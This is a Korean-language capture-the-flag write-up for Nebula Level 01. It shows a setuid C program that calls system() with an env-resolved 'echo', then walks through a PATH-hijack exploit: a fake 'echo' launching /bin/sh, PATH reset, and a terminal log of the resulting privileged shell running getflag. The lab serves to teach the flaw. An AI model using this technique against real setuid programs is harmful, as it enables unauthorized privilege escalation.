# Level 01

## Plot

### About

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

이 소스로 컴파일 된 파일 `flag01`은 `flag01` 유저 권한을 가지고 있다. 우리는 읽기와 실행만 할 수 있는 `level01` 권한이 주어졌으니, 이 프로그램을 어떻게든 이용해 `flag01`의 권한으로 `getflag`를 실행시키면 된다!

위 소스를 보면 `getegid`함수와 `geteuid`함수의 리턴값을 `gid`변수와 `uid`변수에 넣고 `setresgid`함수와 `setresuid`함수를 사용하는 걸 볼 수 있다. 이는 이 파일을 실행하는 사용자의 권한을 파일의 소유자인 `flag01` 계정의 권한을 부여하기 위해서 Effective ID를 가져와 설정하는 것으로 생각하면 된다.

참고로, Unix에서는 실제 사용자의 ID와 프로그램을 실행하는 사용자의 ID가 분리 되어 있다.

- Real ID : 사용자가 원래 부터 가지고 있는 진짜 권한
- Effective ID : 사용자가 현재 가지고 있는 권한

이를 이용해 사용자가 다른 사용자의 권한을 이용할 수 있게 만들수 있다.

## 환경변수를 조작하자

`/home/level01`에 `/bin/sh`을 실행하는 `echo` 프로그램을 하나 만들어 놓는다. 
그리고 `PATH` 환경변수 값을 없애고 `/home/level01`만 넣어 놓으면 `flag01` 프로그램에서 호출하는 `system` 함수의 `echo`는
임의로 우리가 생성한 `echo` 프로그램이 되고, 우리는 `flag01`의 권한으로 `/bin/sh`을 실행할 수 있게 된다.

```text
level01@nebula:/home/flag01$ ls -al
total 13
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
level01@nebula:/home/flag01$ PATH=/home/level01
level01@nebula:/home/flag01$ /usr/bin/env
TERM=xterm-256color
SHELL=/bin/sh
...
PATH=/home/level01
...
_=/usr/bin/env
level01@nebula:/home/flag01$ ./flag01
sh-4.2$ /bin/getflag
You have successfully executed getflag on a target account
```

좀 어거지로 한 느낌이 있긴 한데... 다른 사람들의 풀이를 살펴보자.